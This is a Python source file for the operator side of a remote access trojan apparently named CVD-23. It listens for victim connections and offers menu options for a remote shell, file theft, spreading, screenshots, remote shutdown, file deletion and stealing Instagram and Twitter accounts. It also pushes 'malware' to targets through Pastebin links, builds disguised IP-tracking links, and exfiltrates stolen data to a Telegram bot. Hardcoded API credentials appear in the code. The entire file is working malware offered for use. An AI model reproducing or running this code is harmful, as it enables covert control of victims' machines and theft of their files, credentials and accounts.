try:
    import socket,time,os
    from datetime import datetime
    from platform import *
    from subprocess import Popen
    from requests import get,post
    from colorama import Fore
    from configuration import token,id,host,port,api_key,api_username,api_password,email
    f_size=2048;end_f="<end_of_file>";ext_msg='[!]  Error please restart the tool'
    sysname=system();usrname=uname()[1]
    rc=Fore.LIGHTRED_EX;Rc=Fore.RED;gc=Fore.GREEN;Gc=Fore.LIGHTGREEN_EX;rsc=Fore.RESET;cya=Fore.CYAN;wh=Fore.WHITE;bc=Fore.BLUE
    systems=['Linux','Windows']
    notin=['Darwin']
    if sysname in systems:pass
    elif sysname in notin:print(Rc+"[!] Very Sorry This Tool is not supported by your system [Mac-IPhone] ..")
    else:print(Rc+f"[!] Very Sorry This Tool is not supported by your system [{sysname}] ..")#The Tool is Beta For Now
except:exit('very smart move From a Hacker Nice !')#How you will even hack any one (: !


def banner():
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
        if sysname=='Windows':
            try:
                Popen('neofetch -c red -ac green');time.sleep(2)
            except:
                print(f"""
 ██████╗██╗   ██╗██████╗       ██████╗ ██████╗ 
██╔════╝██║   ██║██╔══██╗      ╚════██╗╚════██╗
██║     ██║   ██║██║  ██║█████╗ █████╔╝ █████╔╝
██║     ╚██╗ ██╔╝██║  ██║╚════╝██╔═══╝  ╚═══██╗
╚██████╗ ╚████╔╝ ██████╔╝      ███████╗██████╔╝
 ╚═════╝  ╚═══╝  ╚═════╝       ╚══════╝╚═════╝ 
    └─{rc}Never Tell {Rc}anyone {wh}about your next move, {gc}surprise {wh}them with the result 
          ┌
          └─{rc}${Rc} - Filza{wh}
               ┌
               └─{cya}2{wh}+{cya}1{wh}={bc}#{rc}Hacked""");time.sleep(1.5)
        else:
            try:Popen('neofetch');time.sleep(2)
            except:exit('[!] You need to download neofetch >> "sudo apt install neofetch" or run "Linux-installer.sh" ')
    except KeyboardInterrupt:exit('')
banner()
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
    s.bind((host,port))
except OSError:
    print(f'{rc}[!] wait Address already in use !!')
    exit(221298)
time.sleep(1.5)
print(f'{rc}[{wh}\{rc}] welcome {usrname}')
print(f"{rc}[{wh}/{rc}] waiting For {Rc}connect ...")
s.listen(1)
c,addr=s.accept()
print(f"{rc}[{wh}+{rc}] {rc}connected , To :{Rc}{addr}");time.sleep(1.5)


def Terminal():
    #shutdown="shutdown /s /f"                
    #fast shutdown="shutdown /p /f"
    #restart = "shutdown /r /f"
    #tasklist or "tasklist -v"
    #ipconfig
    #whoami /priv
    os.system('cls' if os.name == 'nt' else 'clear')
    try:
        usrcmd=''
        while usrcmd!='e':
            usrcmd=input(f"{Rc}┌─[{Gc}CVD-23{bc}~{wh}@HOME{Rc}/{bc}Terminal{Rc}]\n└──╼ {wh}$ {rc}")
            if usrcmd=='':exit(221298)#Type a command !!
            elif len(usrcmd) == 2 and usrcmd[0].isalpha() and usrcmd[1] == ":":
                c.send(usrcmd.encode())
                continue
            elif usrcmd.startswith("cd"):
                c.send(usrcmd.encode())
                continue
            c.sendall((usrcmd).encode())
            data=c.recv(1000000)
            print(data.decode())
        s.close()
    except:print(f'{Rc}[{rc}!{Rc}]  Error in exce command ')


def Filestealer():
    os.system('cls' if os.name == 'nt' else 'clear')
    mssg=''
    while mssg!='e':
        os.system('cls' if os.name == 'nt' else 'clear')
        try:
            print(f'\n{Rc}[{wh}!{Rc}]{rc}  This is the Program name on the Target computer ..')#Joker.txt this file on target computer , if you want to download it just type the file name "Joker.txt" You must type it right , how you get the file name? Go back and type choice number 1 "control of the Target Terminal" and type after that "ls" copy the program-file name and type it here 
            f_p=input(f"{Rc}[{wh}?{Rc}]{cya}  The Program Name:")
            if f_p=='':exit("[!]  Try to Type a Name !!")
            else:
                c.send(f_p.encode())
                f=c.recv(1000000)
                print(f"\n{Rc}[{wh}!{Rc}]{rc}  This path and name for the Program you just copy from target ..")#/home/TweakPY/Desktop/Joker-Filza/Downloads/Test1               in the Left You have The path ,for downloaded file and on the end of the path you have the file name you want as ex you downloaded the file but you want to rename it to something else, you type home/desktop/TweakPY/downloads/{name}
                f_n=input(f"{Rc}[{wh}?{Rc}]{cya}  The Path-Name:")
                if f_n=='':exit("[!]  Try to Type a Name !!")
                else:
                    n_f=open(f_n,'wb')
                    n_f.write(f)
                    print(f"{Rc}[{rc}+{Rc}]  {gc}Done !"),time.sleep(2)
                    n_f.close()
        except:exit('[!]  Error in copy File ..')
    s.close()


def Spread():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{Rc}[{wh}+{Rc}]  {rc}Trying To spread the File in the Target computer"),time.sleep(0.6)
    print(f'\n{Rc}'+c.recv(1000000).decode()+'\n')
    try:input(f"\n{Rc}[{wh}*{Rc}]  {gc}Back To Menu (Press Enter...) ");main()
    except:exit(ext_msg) 


def Webbrowse():
    os.system('cls' if os.name == 'nt' else 'clear')
    web=input(f"{Rc}┌─[{Gc}CVD-23{bc}~{wh}@HOME{Rc}/{bc}Web-Browse{Rc}/{bc}Your-url{Rc}]\n└──╼ {wh}$ {rc}")
    if web=="":print(Rc+'[!]  Try to type a url !')
    else:
        c.send(web.encode()),time.sleep(0.5)
        print(f'\n{gc}'+c.recv(1000000).decode())
    try:input(f"\n{Rc}[{wh}*{Rc}]  {gc}Back To Menu (Press Enter...) ");main()
    except:exit(ext_msg) 


def Track_CIPM():
    os.system('cls' if os.name == 'nt' else 'clear')    
    url_red=input(f'{Rc}[{wh}+{Rc}]  {wh}Enter Your url: ')
    if url_red=='':print(f'{Rc}[{wh}!{Rc}]  {wh}Enter url please ..');time.sleep(0.9);return Track_CIPM()
    if email=='':exit(f'{Rc}[{wh}!{Rc}]  {wh}Please input a Email in config File !!')
    elif '@' not in email:exit(f'{Rc}[{wh}!{Rc}]  {wh}Check your email please and retry !!')
    d=f"""
-----------------------------8386526011242191222501571313
Content-Disposition: form-data; name="type"

fast_redirect
-----------------------------8386526011242191222501571313
Content-Disposition: form-data; name="email"

{email}
-----------------------------8386526011242191222501571313
Content-Disposition: form-data; name="webhook"


-----------------------------8386526011242191222501571313
Content-Disposition: form-data; name="fmt"


-----------------------------8386526011242191222501571313
Content-Disposition: form-data; name="memo"

{url_red}
-----------------------------8386526011242191222501571313
Content-Disposition: form-data; name="clonedsite"


-----------------------------8386526011242191222501571313
Content-Disposition: form-data; name="sql_server_table_name"

TABLE1
-----------------------------8386526011242191222501571313
Content-Disposition: form-data; name="sql_server_view_name"

VIEW1
-----------------------------8386526011242191222501571313
Content-Disposition: form-data; name="sql_server_function_name"

FUNCTION1
-----------------------------8386526011242191222501571313
Content-Disposition: form-data; name="sql_server_trigger_name"

TRIGGER1
-----------------------------8386526011242191222501571313
Content-Disposition: form-data; name="redirect_url"

{url_red}
-----------------------------8386526011242191222501571313--"""
    req=post("https://canarytokens.org/generate",headers={'Host': 'canarytokens.org','User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0','Accept': 'application/json, text/javascript, */*; q=0.01','Accept-Language': 'ar,en-US;q=0.7,en;q=0.3','Accept-Encoding': 'gzip, deflate','X-Requested-With': 'XMLHttpRequest','Content-Type': 'multipart/form-data; boundary=---------------------------8386526011242191222501571313','Content-Length': '1451','Origin': 'https://canarytokens.org','Referer': 'https://canarytokens.org/generate','Te': 'trailers','Connection': 'close'},data=d).json()
    try:
        token=req["Token"];em=req["Email"];url=f'https://canarytokens.com/TweakPY.vv1ck/{token}'
        try:
            res=post('https://hideuri.com/api/v1/shorten',headers={'Host': 'hideuri.com','Cookie': '_cfvdata=as874as89sa9as84s89f4asfa8f','User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0','Accept': 'application/json, text/javascript, */*; q=0.01','Accept-Language': 'ar,en-US;q=0.7,en;q=0.3','Accept-Encoding': 'gzip, deflate','Referer': 'https://hideuri.com/','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With': 'XMLHttpRequest','Content-Length': '47','Origin': 'https://hideuri.com','Te': 'trailers'},data=f'url={url}')
            if 'result_url' in res.json():shorted_url=res.json()['result_url']
            else:pass
        except:shorted_url='Null'
        print("-------------------------------")
        print(f'{Rc}[{wh}+{Rc}]  Token: {token}')
        print(f'{Rc}[{wh}+{Rc}]  url: {url}')#we will send that to the target don't worry.
        print(f'{Rc}[{wh}+{Rc}]  Shorted url: {shorted_url}')
        print(f'{Rc}[{wh}+{Rc}]  Email: {em}')
        if shorted_url !='Null':
            if 'hideuri.com' in shorted_url:url=shorted_url
            else:pass
        else:pass
        c.send(url.encode())
        res=c.recv(1000000).decode()
        print(f'\n{Rc}{res}')
    except:print(f'{Rc}[{wh}!{Rc}]  {rc}Error ..{wh}')
    try:input(f"\n{Rc}[{wh}*{Rc}]  {gc}Back To Menu (Press Enter...) ");main()
    except:exit(ext_msg)   


def Dev():
    print(f"""
{gc}[*]{bc}  Develper : Filza & Joker 
{gc}[*]{Fore.MAGENTA}  Github : github.com/Filza2 && github.com/vv1ck
{gc}[*]{cya}  Telegram Channel @TweakPY & @vv1ck""")
    try:input(rc+"\n[*]  Back To Menu (Press Enter...) ");main()
    except:exit()


def Target_informations():
    os.system('cls' if os.name == 'nt' else 'clear')
    try:
        d=datetime.now()
        d1=d.strftime("%m-%d-%Y-%H.%M.%S")
        LIM=c.recv(1000000).decode()
        LIM2=str(LIM)
        TLS=input(f'{Rc}[{wh}?{Rc}]  {cya}You want to send this data in Telegram ? {Rc}[{wh}y{Rc}-{wh}n{Rc}]: {rc}')
        print(Rc+LIM2)
        if os.path.exists(f'Target-{d1}.txt')==False:
            file=open(f'Target-{d1}.txt','a')
            file.write(LIM2+'\n\nThe Quieter You Become, The More You Are Able To Hear\n\nwe always here \t\t@TweakPY - @vv1ck')
            file.close()
        elif os.path.exists(f'Target-{d1}.txt')==True:
            os.remove(f'Target-{d1}.txt')
            file=open(f'Target-{d1}.txt','a')
            file.write(LIM2+'\n\nThe Quieter You Become, The More You Are Able To Hear\n\nwe always here \t\t@TweakPY - @vv1ck')
            file.close()
        else:
            try:
                file=open(f'Target__1-{d1}.txt','a')
                file.write(LIM2+'\n\nThe Quieter You Become, The More You Are Able To Hear\n\nwe always here \t\t@TweakPY - @vv1ck')
                file.close()
            except:
                file=open(f'Target__2-{d1}.md','a')
                file.write(LIM2+'\n\nThe Quieter You Become, The More You Are Able To Hear\n\nwe always here \t\t@TweakPY - @vv1ck')
                file.close()
        if 'y' in TLS:
            try:post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text={LIM2}\n\nBy @TweakPY - @vv1ck')
            except:pass
        else:pass
    except:print(f'{Rc}[!]  Error in Getting informations ..')
    try:input(f"\n{Rc}[{wh}*{Rc}]  {gc}Back To Menu (Press Enter...) ");main()
    except:exit(ext_msg) 


def Message_Sender():
    os.system('cls' if os.name == 'nt' else 'clear')
    try:
        mssg=''
        print(f'{Rc}[{wh}!{Rc}]  Type {rc}SDR{Rc} to reboot target computer or {rc}SDT{Rc} to shutdown the target computer after you done .\n')
        while mssg!='e':
            msg=input(f"{Rc}┌─[{Gc}CVD-23{bc}~{wh}@HOME{Rc}/{bc}Message-Sender{Rc}/{bc}Your-Message{Rc}]\n└──╼ {wh}$ {rc}")
            if msg=='SDT':c.send('SDT'.encode())
            elif msg=='SDR':c.send('SDR'.encode())
            c.send(msg.encode())
            MSHT=str(c.recv(1000000).decode())
            print(f'{Rc}[{rc}${Rc}]  {wh}Target Respone : ',MSHT)
        s.close()
    except:print(f'{Rc}[!]  Error please Retry')
    

def File_Manger():
    time.sleep(1.5);os.system('cls' if os.name == 'nt' else 'clear')
    try:
        print(cya+"""
             _________
          [ File Manger ]
             ||||||||
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[1] Extract Folder content
[2] Create a New Folder
[3] Create a New File
[4] Delete a File
[5] Delete a Folder
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n""")
        nch=input(f"{Rc}┌─[{Gc}CVD-23{bc}~{wh}@HOME{Rc}/{bc}File-Manger{Rc}]\n└──╼ {wh}$ {rc}")
        #if you got '0' that's mean a error occurred
        if nch=='':print(rc+"[!]  Try To type a number !!")
        c.send(nch.encode())
        if nch=='1':
            #The Folder name you want to get his content
            flname=input(f"{Rc}┌─[{Gc}CVD-23{bc}~{wh}@HOME{Rc}/{bc}File-Manger{Rc}/{bc}Extract-Folder-content{Rc}/{bc}Folder-Name{Rc}]\n└──╼ {wh}$ {rc}")
            c.send(flname.encode())
            res=c.recv(1000000).decode()
            if 'check_loop_faild' in res:print(rc+'[!]  The File is empty')
            else:print(res)
        elif nch=='2':
            #The Folder name you want to crate
            fldname=input(f"{Rc}┌─[{Gc}CVD-23{bc}~{wh}@HOME{Rc}/{bc}File-Manger{Rc}/{bc}Create-Folder{Rc}/{bc}Folder-Name{Rc}]\n└──╼ {wh}$ {rc}")
            c.send(fldname.encode())
            res2=c.recv(1000000).decode()
            if '1' in res2:print(f'{Rc}[{wh}+{Rc}]  {gc}success')
            elif '0' in res2:print(f'{Rc}[{wh}-{Rc}]  {rc}Failed')
            else:print(f'{Rc}[{wh}%{Rc}]  {rc}please wait..')
        elif nch=='3':
            #The File name you want to crate
            fllname=input(f"{Rc}┌─[{Gc}CVD-23{bc}~{wh}@HOME{Rc}/{bc}File-Manger{Rc}/{bc}Create-File{Rc}/{bc}File-Name{Rc}]\n└──╼ {wh}$ {rc}")
            c.send(fllname.encode())
            res3=c.recv(1000000).decode()
            if '1' in res3:print(f'{Rc}[{wh}+{Rc}]  {gc}success')
            elif '0' in res3:print(f'{Rc}[{wh}-{Rc}]  {rc}Failed')
            else:print(f'{Rc}[{wh}%{Rc}]  {rc}please wait..')
        elif nch=='4':
            #The File name you want to Delete
            flllname=input(f"{Rc}┌─[{Gc}CVD-23{bc}~{wh}@HOME{Rc}/{bc}File-Manger{Rc}/{bc}Delete-File{Rc}/{bc}File-Name{Rc}]\n└──╼ {wh}$ {rc}")
            c.send(flllname.encode())
            res4=c.recv(1000000).decode()
            if '1' in res4:print(f'{Rc}[{wh}+{Rc}]  {gc}success')
            elif '0' in res4:print(f'{Rc}[{wh}-{Rc}]  {rc}Failed')
            else:print(f'{Rc}[{wh}%{Rc}]  {rc}please wait..')
        elif nch=='5':
            #The Folder name you want to Delete
            flldname=input(f"{Rc}┌─[{Gc}CVD-23{bc}~{wh}@HOME{Rc}/{bc}File-Manger{Rc}/{bc}Delete-Folder{Rc}/{bc}Folder-Name{Rc}]\n└──╼ {wh}$ {rc}")
            c.send(flldname.encode())
            res5=c.recv(1000000).decode()
            if '1' in res5:print(f'{Rc}[{wh}+{Rc}]  {gc}success')
            elif '0' in res5:print(f'{Rc}[{wh}-{Rc}]  {rc}Failed')
            else:print(f'{Rc}[{wh}%{Rc}]  {rc}please wait..')
    except:exit(ext_msg) 
    try:File_Manger()
    except:exit(ext_msg) 


def File_uploder():
    #[!] Very Sorry This Feature is For Linux only For Now [Target system]//-*-//
    time.sleep(1.5);os.system('cls' if os.name == 'nt' else 'clear')
    def POST_FILE():
        #[!] Very Sorry This Feature is For Linux only For Now [Target system]//-*-//
        #put your tool file name
        tool=input(f"{Rc}┌─[{Gc}CVD-23{bc}~{wh}@HOME{Rc}/{bc}File-uploder{Rc}/{bc}Send-Tool{Rc}/{bc}File-Name{Rc}]\n└──╼ {wh}$ {rc}")
        try:
            tool2=open(tool,'r').read()
        except FileNotFoundError:print(f'{Rc}[!]  File Not Found retry');POST_FILE()
        print(f"{Rc}[{wh}+{Rc}]{cya}  Nice tool, where did you get it (: ? ")
        try:
            title=time.ctime()
            if api_key=='':api_key1='wTvZhGCi6mYRG3vr6Q-yFoH-Snq5a03W'
            else:api_key1=api_key
            if api_password=='':api_password1='PmB3f5bmff748JW'
            else:api_password1=api_password
            if api_username=='':api_username1='CVD-23'
            else:api_username1=api_username
            login_data={'api_dev_key':api_key1,'api_user_name':api_username1,'api_user_password':api_password1} ;data={'api_option':'paste','api_dev_key':api_key1, 'api_paste_code':tool2,'api_paste_name':title,'api_paste_expire_date':'1H','api_user_key':None,'api_paste_format':'text'};login=post('https://pastebin.com/api/api_login.php',data=login_data);data['api_user_key']=login.text;r=post('https://pastebin.com/api/api_post.php',data=data).text;id=r.split('https://pastebin.com/')[1];malw=(f'https://pastebin.com/raw/{id}')
            print(f'{Rc}[{wh}+{Rc}]  {wh}Your Tool URL ({rc}malware{wh}): {malw}')
            c.send(malw.encode())
        except:print(rc+'[!]  Error in posting the tool !!')
        input(f"\n{Rc}[{wh}*{Rc}]  Exit The Tool (Press Enter...) ");exit() 
    def POST_URL():
        #[!] Very Sorry This Feature is For Linux only For Now [Target system]//-*-//
        #put Your Tool url
        tool=input(f"{Rc}┌─[{Gc}CVD-23{bc}~{wh}@HOME{Rc}/{bc}File-uploder{Rc}/{bc}Send-Tool-url{Rc}/{bc}Tool-url{Rc}]\n└──╼ {wh}$ {rc}")
        c.send(tool.encode())
        input(f"\n{Rc}[{wh}*{Rc}]  Exit The Tool (Press Enter...) ");exit()
    def PURLFILE():
        #[!] Very Sorry This Feature is For Linux only For Now [Target system]//-*-//
        print(f"""{Fore.LIGHTCYAN_EX}Select Mode:\n\n[1] Send Your Tool\n[2] Send Your Tool url\n""")#1-we post the tool on a website and send the url to target /////// 2-you already posted the tool on another website and want to send the url to target
        PURL_FILE=input(f"{Rc}┌─[{Gc}CVD-23{bc}~{wh}@HOME{Rc}/{bc}File-uploder{Rc}]\n└──╼ {wh}$ {rc}")#the url must be a txt or raw website like pastbin or you must edit target file for downloading from your url
        if PURL_FILE=='1':os.system('cls' if os.name == 'nt' else 'clear');POST_FILE()
        elif PURL_FILE=='2':os.system('cls' if os.name == 'nt' else 'clear');POST_URL()
        else:PURLFILE()
    PURLFILE()


def Account_Stealer():
    os.system('cls' if os.name == 'nt' else 'clear')
    try: 
        d=datetime.now()
        d1=d.strftime("%m-%d-%Y-%H.%M.%S")
    except:d1='Null'
    def IG():
        TLS=input(f'{Rc}[{wh}?{Rc}]  {cya}You want to send this data in Telegram ? {Rc}[{wh}y{Rc}-{wh}n{Rc}]: {rc}')
        print(f"""
┌──
└─ {rc}$ {wh}Now You Just Have To Wait Target Respone  
        """)
        res=c.recv(1000000).decode()
        print(f'{Rc}[{rc}+{Rc}]  {wh}Respone :',str(res))
        if 'Done' in res:
            if os.path.exists(f'Account-instagram-{d1}.json')==False:
                file=open(f'Account-instagram-{d1}.json','a')
                file.write(res+'\n\nThe Quieter You Become, The More You Are Able To Hear\n\nwe always here \t\t@TweakPY - @vv1ck')
                file.close()
            elif os.path.exists(f'Account-instagram-{d1}.json')==True:
                os.remove(f'Account-instagram-{d1}.json')
                file=open(f'Account-instagram-{d1}.json','a')
                file.write(res+'\n\nThe Quieter You Become, The More You Are Able To Hear\n\nwe always here \t\t@TweakPY - @vv1ck')
                file.close()
            if 'y' in TLS:
                try:post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text={res}\n\nBy @TweakPY - @vv1ck')
                except:pass
            else:pass
        else:pass
        try:input(f"\n{Rc}[{wh}*{Rc}]  {wh}Back To Menu (Press Enter...) {rc}");main()
        except:exit(ext_msg) 
    def TW():
        TLS=input(f'{Rc}[{wh}?{Rc}]  {cya}You want to send this data in Telegram ? {Rc}[{wh}y{Rc}-{wh}n{Rc}]: {rc}')
        print(f"""
┌──
└─ {rc}$ {wh}Now You Just Have To Wait Target Respone  
        """)
        res=c.recv(1000000).decode()
        print(f'{Rc}[{rc}+{Rc}]  {wh}Respone :',str(res))
        if 'Done' in res:
            if os.path.exists(f'Account-Twitter-{d1}.json')==False:
                file=open(f'Account-Twitter-{d1}.json','a')
                file.write(res+'\n\nThe Quieter You Become, The More You Are Able To Hear\n\nwe always here \t\t@TweakPY - @vv1ck')
                file.close()
            elif os.path.exists(f'Account-Twitter-{d1}.json')==True:
                os.remove(f'Account-Twitter-{d1}.json')
                file=open(f'Account-Twitter-{d1}.json','a')
                file.write(res+'\n\nThe Quieter You Become, The More You Are Able To Hear\n\nwe always here \t\t@TweakPY - @vv1ck')
                file.close()
            if 'y' in TLS:
                try:post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text={res}\n\nBy @TweakPY - @vv1ck')
                except:pass
            else:pass
        else:pass
        try:input(f"\n{Rc}[{wh}*{Rc}]  {wh}Back To Menu (Press Enter...) {rc}");main()
        except:exit(ext_msg) 
    def IG_TW():
        print(f"""{Fore.LIGHTCYAN_EX}Select Mode:\n\n[1] {Fore.MAGENTA}instagram{Fore.LIGHTCYAN_EX}\n[2] {bc}Twitter{wh}\n""")
        TW_IG=input(f"{Rc}┌─[{Gc}CVD-23{bc}~{wh}@HOME{Rc}/{bc}Account-Stealer{Rc}]\n└──╼ {wh}$ {rc}")
        if TW_IG=='1':c.send('1'.encode());IG()
        elif TW_IG=='2':c.send('2'.encode());TW()
        else:IG_TW()
    IG_TW()


def Screen_pic():
    os.system('cls' if os.name == 'nt' else 'clear')
    try:
        print(f'{Rc}[{wh}+{Rc}]  {wh}Taking Screenshot Now ..')
        file_name=c.recv(1024)
        exists=c.recv(1024)
        if exists.decode()=="yes":
            exists_f="yes"
            c.send(exists_f.encode())
            with open('Tweakpy-vv1ck-'.encode()+file_name,"wb") as pic:
                print(f'{Rc}[{wh}+{Rc}]  {wh}Downloading Screenshot Now ..')
                while True:
                    pic_1=c.recv(f_size)
                    if pic_1.endswith(end_f.encode()):
                        pic_1=pic_1[:-len(end_f)]
                        pic.write(pic_1)
                        break
                    pic.write(pic_1) 
            print(f'{Rc}[{wh}+{Rc}]  {wh}Screenshot Downloaded {gc}successfully ..')
        else:print(f'{Rc}[{wh}+{Rc}]  {wh}Screenshot Download {Rc}Faild ..')
    except:
        try:input(f"\n{Rc}[{wh}*{Rc}]  {gc}Back To Menu (Press Enter...) ");main()
        except:exit(ext_msg) 
    try:input(f"\n{Rc}[{wh}*{Rc}]  {gc}Back To Menu (Press Enter...) ");main()
    except:exit(ext_msg)


def main():
    time.sleep(1.1);os.system('cls' if os.name == 'nt' else 'clear')
    banner()  
    time.sleep(0.1)
    print(f"""
{Rc}[{wh}*{Rc}]{cya} Choose one of the options below \n
{Rc}[1]{wh} Terminal Controlor                {Rc}[7]{wh} Target informations 
{Rc}[2]{wh} File Stealer                      {Rc}[8]{wh} Message Sender  
{Rc}[3]{wh} Spread                            {Rc}[9]{wh} File Manger 
{Rc}[4]{wh} WebBrowse                         {Rc}[10]{wh} File uploder 
{Rc}[5]{wh} Track CIPM {Rc}[{gc}//{Rc}]                   {Rc}[11]{wh} Account Stealer {Rc}[{gc}//{Rc}]
{Rc}[6]{wh} Developer                         {Rc}[12]{wh} ScreenShot
{Rc}[{gc}////////////{Rc}]                        {Rc}[99]{wh} Exit . . . 
""")
    choice=input(f"{Rc}┌─[{Gc}CVD-23{bc}~{wh}@HOME{Rc}]\n└──╼ {wh}$ {rc}")
    if choice=='':print(Rc+"[!]  Try To type a number !!"),main()
    c.send(choice.encode())
    if choice=='1':Terminal()
    elif choice=='2':Filestealer()
    elif choice=='3':Spread()
    elif choice=='4':Webbrowse()
    elif choice=='5':Track_CIPM()
    elif choice=='6':Dev()
    elif choice=='7':Target_informations()
    elif choice=='8':Message_Sender()
    elif choice=='9':File_Manger()
    elif choice=='10':File_uploder()
    elif choice=='11':Account_Stealer()
    elif choice=='12':Screen_pic()
    elif choice=='e':input(rc+"[*]  Exit The Tool (Press Enter...) ");os.system('cls' if os.name == 'nt' else 'clear');exit()
    elif choice=='99':input(rc+"[*]  Exit The Tool (Press Enter...) ");os.system('cls' if os.name == 'nt' else 'clear');exit()
    else:
        os.system('cls' if os.name == 'nt' else 'clear')
        return main()


try:main()
except KeyboardInterrupt:exit(2030)